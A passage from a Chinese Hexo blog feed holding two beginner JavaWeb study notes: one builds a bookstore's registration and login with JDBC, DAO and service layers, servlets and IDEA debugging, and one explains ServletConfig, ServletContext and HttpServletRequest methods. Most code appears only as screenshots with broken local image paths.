src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504153057140.png" alt="image-20210504153057140"></p><p>有两个方法，获取数据库连接和关闭数据库连接。</p><p>要连接数据库，还需要一个数据库的配置文件，应该在src目录下新建一个文件：jdbc.properties</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504165527099.png" alt="image-20210504165527099"></p><p>然后在JdbcUtils.java中去读取配置文件</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504165619172.png" alt="image-20210504165619172"></p><p>注意，需要导入两个jar包</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504165725209.png" alt="image-20210504165725209"></p><p>用的连接Mysql包是5.几的版本，因此需要使用Mysql5.x的版本。最开始使用的是8.x的，报错了。</p><p>实现创建连接对象和关闭连接的函数</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504165649506.png" alt="image-20210504165649506"></p><p>到Test包里写一个测试类JdbcUtilsTest，测试能否顺利连接数据库</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504165920921.png" alt="image-20210504165920921"></p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504165954853.png" alt="image-20210504165954853"></p><p>返回了连接数据库的对象。</p><h2 id="编写BaseDao类操作数据库"><a href="#编写BaseDao类操作数据库" class="headerlink" title="编写BaseDao类操作数据库"></a>编写BaseDao类操作数据库</h2><p>在dao.impl包下新建一个BaseDao类，这个类是抽象类。需要先下载一个common-dbutils-1.3 jar, 并导入进来。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504172336518.png" alt="image-20210504172336518"></p><p>首先创建一个QueryRunner对象，它就是用来执行sql语句的。</p><p>然后是update方法，传sql语句以及参数进去，先连接数据库，然后执行sql语句。它可以进行增删改操作。同理</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504172459890.png" alt="image-20210504172459890"></p><p>它可以执行查询sql语句后返回一条数据</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504172555245.png" alt="image-20210504172555245"></p><p>这个可以返回多条数据</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504172613075.png" alt="image-20210504172613075"></p><p>这个可以返回一行一列的数据。</p><h2 id="编写UserDao接口类"><a href="#编写UserDao接口类" class="headerlink" title="编写UserDao接口类"></a>编写UserDao接口类</h2><p>根据前端的功能，需要进行相应的数据库操作。上面已经实现了数据库操作方法，UserDao就是提供了一个接口去根据相应功能操作数据库。</p><p>首先在dao.impl包下，新建一个UserDao接口。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504175642548.png" alt="image-20210504175642548"></p><p>但是UserDao需要在dao下，而不是dao.impl下，因此将impl删除。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504175721974.png" alt="image-20210504175721974"></p><p>报错了，点击错误，选择移动即可</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504175806056.png" alt="image-20210504175806056"></p><p>填写上接口</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504180141357.png" alt="image-20210504180141357"></p><p>一个是根据用户名查询用户信息，用来注册时检查用户名是否已经存在；</p><p>一个是根据用户名和密码查询用户信息，用来检查登陆信息是否正确；</p><p>最后是保存用户信息。用来注册用户。</p><h2 id="编写UserDaoImpl实现类"><a href="#编写UserDaoImpl实现类" class="headerlink" title="编写UserDaoImpl实现类"></a>编写UserDaoImpl实现类</h2><p>继承BaseDao类，实现UserDao类，去实现3个功能接口。</p><p>在dao的impl下新建UserDaoImpl类</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504180539420.png" alt="image-20210504180539420"></p><p>选择三个接口函数后确认。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504181059732.png" alt="image-20210504181059732"></p><p>实现三个接口。之后要测试这三个接口，可以到UserDao接口类中，按Ctrl+Shift+T</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504181220446.png" alt="image-20210504181220446"></p><p>点击</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504181324781.png" alt="image-20210504181324781"></p><p>按图中选择，确定</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504181525727.png" alt="image-20210504181525727"></p><p>新建UserDao对象，调用方法，查询admin记录</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504181555928.png" alt="image-20210504181555928"></p><p>成功查询。最后完善方法</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504182042484.png" alt="image-20210504182042484"></p><h2 id="编写UserService接口类"><a href="#编写UserService接口类" class="headerlink" title="编写UserService接口类"></a>编写UserService接口类</h2><p>该接口提供处理业务的功能。在service.impl下新建一个接口类UserService, 同样在package中去掉impl, 然后点击错误处理的小灯，移动即可。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504182634203.png" alt="image-20210504182634203"></p><p>写了三个接口，注册，登陆，判断用户是否存在。</p><h2 id="编写UserServiceImpl实现类"><a href="#编写UserServiceImpl实现类" class="headerlink" title="编写UserServiceImpl实现类"></a>编写UserServiceImpl实现类</h2><p>在service的impl下新建，然后Ctrl+O，点击三个接口并确认，实现</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504183131528.png" alt="image-20210504183131528"></p><p>之后测试三个接口，同样切换到UserService接口类中，Ctrl+Shift+T</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504183240292.png" alt="image-20210504183240292"></p><p>填写函数</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504183913867.png" alt="image-20210504183913867"></p><h1 id="编写一个注册页面"><a href="#编写一个注册页面" class="headerlink" title="编写一个注册页面"></a>编写一个注册页面</h1><p>在web目录下新建user目录，然后新建regist.html</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504190044581.png" alt="image-20210504190044581"></p><p>访问：<a href="http://localhost:8080/book/user/regist.html" target="_blank" rel="noopener">http://localhost:8080/book/user/regist.html</a></p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504190100021.png" alt="image-20210504190100021"></p><h1 id="编写注册RegistServlet类"><a href="#编写注册RegistServlet类" class="headerlink" title="编写注册RegistServlet类"></a>编写注册RegistServlet类</h1><p>在web包下新建一个RegistServlet类（注意，首字母要大写，小写了在web.xml没找到…)</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504191402794.png" alt="image-20210504191402794"></p><p>web.xml中配置访问路径</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504191418506.png" alt="image-20210504191418506"></p><p>继续完善RegistServlet</p><p>首先检查验证码是否正确</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504191653299.png" alt="image-20210504191653299"></p><p>不正确就跳转回注册界面。正确之后</p><p>先检查用户名是否存在</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504192159331.png" alt="image-20210504192159331"></p><p>首先创建UserService对象，然后调用isExistName方法。注意需要throws SQLException，用户名存在还是转发回注册页面，否则就注册，插入数据：</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504192515099.png" alt="image-20210504192515099"></p><p>然后跳转到登录界面。但是这时候抛出的SQLException出错了。将它删除，然后鼠标移到红线的函数，按提示增加try-catch。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504192723203.png" alt="image-20210504192723203"></p><h1 id="编写登陆界面"><a href="#编写登陆界面" class="headerlink" title="编写登陆界面"></a>编写登陆界面</h1><p>先去user目录下新建一个login.html</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504193041297.png" alt="image-20210504193041297"></p><p>与注册页面差不多，只是不用邮箱了，改为了登陆页面。</p><p>重新部署，然后访问</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504192833432.png" alt="image-20210504192833432"></p><p>输入没有存在的用户名注册</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504193137996.png" alt="image-20210504193137996"></p><p>成功跳转到了登陆页面。</p><h1 id="编写LoginServlet登陆类"><a href="#编写LoginServlet登陆类" class="headerlink" title="编写LoginServlet登陆类"></a>编写LoginServlet登陆类</h1><p>类似注册类。首先在web下新建一个LoginServlet类，然后配置web.xml</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504210619396.png" alt="image-20210504210619396"></p><p>登陆页面login.html的表单的action也应该修改</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504210700267.png" alt="image-20210504210700267"></p><p>实现LoginServlet类</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504213557771.png" alt="image-20210504213557771"></p><p>首先判断验证码是否正确，正确就判断用户名和密码是否正确，正确就进入index.html。</p><p>这里必须要注意，之前那个userService.login函数有问题，它返回的是void类型。因此我将它改成了boolean型，如下</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504213715153.png" alt="image-20210504213715153"></p><p>这是在UserServiceImpl里的。因此UserService接口类也需要改成boolean型</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504213802276.png" alt="image-20210504213802276"></p><p>还需要编写一个index.html</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504211336686.png" alt="image-20210504211336686"></p><p>之后重新部署，访问登陆界面：<a href="http://localhost:8080/book/user/login.html" target="_blank" rel="noopener">http://localhost:8080/book/user/login.html</a></p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504211637927.png" alt="image-20210504211637927"></p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504213900588.png" alt="image-20210504213900588"></p><p>登陆成功。</p><h1 id="debug调试"><a href="#debug调试" class="headerlink" title="debug调试"></a>debug调试</h1><p>首先停止tomcat服务后，点击debug启动</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504204739971.png" alt="image-20210504204739971"></p><p>启动之后一样会打开浏览器访问book工程，即正常运行。在注册类的开头下一个断点</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504204919583.png" alt="image-20210504204919583"></p><p>然后访问注册页面：<a href="http://localhost:8080/book/user/regist.html，输入信息" target="_blank" rel="noopener">http://localhost:8080/book/user/regist.html，输入信息</a></p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504205023315.png" alt="image-20210504205023315"></p><p>点击提交后，浏览器在转圈，看IDEA</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504205101737.png" alt="image-20210504205101737"></p><p>程序停在了断点处，并出现了debug信息。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504205314720.png" alt="image-20210504205314720"></p><p>查看调试相关的按钮</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504205451293.png" alt="image-20210504205451293"></p><ul><li>1：运行到下一行。</li><li>2：进入自己写的函数体部分。比如运行到一个getConnection()函数处，按下2，就会打开这个函数所在的文件，并定位到该函数的实现位置。注意必须是自己写的，不是系统函数。</li><li>3：强制进入函数体部分，包括系统函数。</li><li>4：退出函数体查看，返回上一个文件调用该函数的位置。</li><li>5：不太清楚。应该是打开文件，定位到当前所在行的所在函数的定义处</li><li>6：鼠标点到哪一行，按下6后就会运行到那一行的位置。</li></ul><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504205904262.png" alt="image-20210504205904262"></p><p>这个是运行的函数的堆栈信息。下面的函数调用上面的函数。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504205957798.png" alt="image-20210504205957798"></p><p>分别是停止服务，运行到下一个断点处，临时取消所有断点运行。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该书城注册和登陆完全就是照着JavaEE的三层架构写的。</p><ul><li>首先是数据库和表，使用Mysql建立了book数据库和user表，并添加了数据。</li><li>针对User表，有4个数据，在pojo包下建立了User类，这个类作为JavaBean对象，可以让其它类访问或者设置里面的4个数据。用法是：传4个数据进去给构造函数new一个user对象出来，就可以直接传递这个user对象，其它类获取这个对象后就可以得到4个数据。</li><li>然后是Dao层。有BaseDao类和UserDao接口及UserDaoImpl实现类。BaseDao类只针对数据库操作，增删改查并返回数据。UserDao接口就要考虑到实际需要用到数据库的功能，因此定义了<strong>注册和登陆，查询用户是否存在</strong>3个接口。UserDaoImpl就负责调用BaseDao的方法去实现。</li><li>接着是业务层。在service包下有UserService接口和实现类。接口就要处理业务，而处理业务就需要用到数据库。<strong>业务有3个，注册和登陆，查询用户是否存在。</strong>实现接口就只需要去调用UserDaoImpl中的方法即可。</li><li>之后就是web层。有注册和登陆类。因为是web层，类就首先解析请求中的数据，将一些数据(如username, password)传进service层的方法去查询数据库得到结果，并与解析出来的一些数据进行对比。</li><li>最后就是前端的注册和登陆界面了。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习书城项目的功能的编写。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(2)</title>
    <link href="https://ggyggy666.github.io/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/"/>
    <id>https://ggyggy666.github.io/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/</id>
    <published>2021-05-02T15:01:21.000Z</published>
    <updated>2021-05-03T10:27:40.079Z</updated>
    
    <content type="html"><![CDATA[<p>今天继续学习JavaWeb的Servlet.</p><a id="more"></a><h1 id="ServletConfig类"><a href="#ServletConfig类" class="headerlink" title="ServletConfig类"></a>ServletConfig类</h1><p>通常用于初始化获取配置文件web.xml中的值，该类的作用：</p><ol><li><p>获取web.xml中Servlet-name的值。</p></li><li><p>获取web.xml中init-param的初始化参数名对应的值</p></li><li><p>获取ServletContext对象</p></li></ol><p>首先看到HelloServlet类的init函数</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502230917858.png" alt="image-20210502230917858"></p><p>可以发现传进来的就是ServletConfig对象。</p><p>要获取init-param初始化参数，还需要在web.xml中先定义</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502231357341.png" alt="image-20210502231357341"></p><p>注意是写在servlet中的。代码如下</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502231547666.png" alt="image-20210502231547666"></p><p>之后重启tomcat，访问hello</p><p><img src="https://i.loli.net/2021/05/02/KsiVZBMRmhDnkSJ.png" alt="image-20210502231713621"></p><p>当然ServletConfig类也可以在其它地方使用，只需要建立一个对象即可。如在HelloServlet2中：</p><p><img src="https://i.loli.net/2021/05/02/1i45CPxoFGb2HJ9.png" alt="image-20210502232317666"></p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502232412428.png" alt="image-20210502232412428"></p><p>如果要访问init-param，则需要在web.xml的HelloServlet2的Servlet中添加。</p><p>这里注意，如果HelloServlet2要重写init函数，需要先实现父类</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502232755800.png" alt="image-20210502232755800"></p><p>这是因为HelloServlet2继承的是HttpServlet, 需要super, 而HelloServlet是实现Servlet，不是继承，因此不用super。</p><h1 id="ServletContext类"><a href="#ServletContext类" class="headerlink" title="ServletContext类"></a>ServletContext类</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>上面说了ServletConfig可以通过getServletContext()方法获得ServletContext对象。那么什么是ServletContext？</p><blockquote><p>它是一个接口，表示Servlet的上下文对象；一个Web工程只有一个ServletContext对象实例；ServletContext对象是一个域对象。</p><p>域对象：可以像map一样存储数据，域指存储的数据的操作范围，即整个web工程。</p></blockquote><p><img src="https://i.loli.net/2021/05/03/Jm67UGbwgkiu9ol.png" alt="image-20210503103511012"></p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol><li>能够获取web.xml中上下文参数的值</li><li>能够获取当前工程名字</li><li>能够获取当前工程在硬盘中的真实路径</li><li>能够像map一样存储数据。注意，这个对象是存在于整个web工程的，任何Servlet去访问它都是同一个对象，因此存储的数据也是共享的。</li></ol><p>前3个作用：</p><p>首先新建一个ContextServlet, 然后web.xml中配置访问路径以及context-param</p><p><img src="https://i.loli.net/2021/05/03/6nyC9So5W2u8lQF.png" alt="image-20210503105125823"></p><p>注意，这个context-param不属于任何servlet，它只属于这个工程。上下文对象只能访问context-param, 不能访问其它servlet中的init-param。</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503105722385.png" alt="image-20210503105722385"></p><p>特别要注意获取真实路径，参数是”/“, 说明是当前工程真实路径的根目录</p><p><img src="https://i.loli.net/2021/05/03/IojCZT1mJQeb9yd.png" alt="image-20210503105846630"></p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503105909862.png" alt="image-20210503105909862"></p><p>它的内容对应着IDEA中的web目录。如果要获取web目录下的WEB-INF的真实路径，那么就应该这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;WEB-INF的真实路径是：&quot; + context.getRealPath(&quot;&#x2F;WEB-INF&quot;));</span><br></pre></td></tr></table></figure><p>存储数据：</p><p>首先还是新建ContextServlet1, web.xml中配置访问路径</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503111124034.png" alt="image-20210503111124034"></p><p>获取ServletContext对象，这次不用通过ServletConfig类获取，可以直接通过getServletContext()得到</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503111839987.png" alt="image-20210503111839987"></p><p>在存储前先获取一下数据，存储后再获取数据，对比：</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503112049269.png" alt="image-20210503112049269"></p><p>第一个是null, 存储之后就得到数据了。再新建一个ContextServlet2</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503112339679.png" alt="image-20210503112339679"></p><p>重新部署，然后访问context2, 发现是null值。再去访问context1, 发现先是null, 存储数据后是ggy666。再去访问context2，发现已经不是null值了，而是ggy666。</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503112608916.png" alt="image-20210503112608916"></p><p>由此可说明：ServletContext对象存储的数据生存期是在一次部署期间，重新部署后会被销毁，数据也就没有了。而一旦在部署期间，存储了数据之后，在其它Servlet也能访问到该对象存储的数据。</p><h1 id="常见MIME类型"><a href="#常见MIME类型" class="headerlink" title="常见MIME类型"></a>常见MIME类型</h1><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503122415808.png" alt="image-20210503122415808"></p><h1 id="HttpServletRequest类"><a href="#HttpServletRequest类" class="headerlink" title="HttpServletRequest类"></a>HttpServletRequest类</h1><p>请求进入tomcat服务器后，服务器会将请求封装到Request对象中，然后传递到service方法（doGet()和doPost())中。我们就可以通过doGet的参数里的HttpServletRequest对象调用方法获取请求信息。</p><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getRequestURI()&#x2F;&#x2F;获取请求的资源路径（相对）</span><br><span class="line">getRequestURL()&#x2F;&#x2F;获取请求的资源路径（绝对）</span><br><span class="line">getRemoteHost()&#x2F;&#x2F;获取请求的IP</span><br><span class="line">getHeader(请求头)&#x2F;&#x2F;获取请求头</span><br><span class="line">getParameter(参数名)&#x2F;&#x2F;获取请求的参数</span><br><span class="line">getParameterValues(参数名)&#x2F;&#x2F;获取请求的参数值（多个）</span><br><span class="line">getMethod()&#x2F;&#x2F;获取请求的方法</span><br><span class="line">setAttribute(key, value)&#x2F;&#x2F;设置存储数据</span><br><span class="line">getAtrribute(key)&#x2F;&#x2F;通过key获取对应的值</span><br><span class="line">getRequestDispatcher()&#x2F;&#x2F;获取转发对象</span><br></pre></td></tr></table></figure><p>注意getParameter和getParameterValues的用法</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503125816183.png" alt="image-20210503125816183"></p><p>new一个module，然后new一个Serlvet，配置好访问路径</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503124218313.png" alt="image-20210503124218313"></p><p>在doGet方法中测试方法</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503125848188.png" alt="image-20210503125848188"></p><p>编辑配置</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503124829992.png" alt="image-20210503124829992"></p><p>运行</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503125903048.png" alt="image-20210503125903048"></p><p>可以注意到getParameterValues并没有正确使用。需要如下使用：</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130715313.png" alt="image-20210503130715313"></p><p>加上Arrays.asList，将获取到的数据转为列表形式才行。然后重新部署后访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 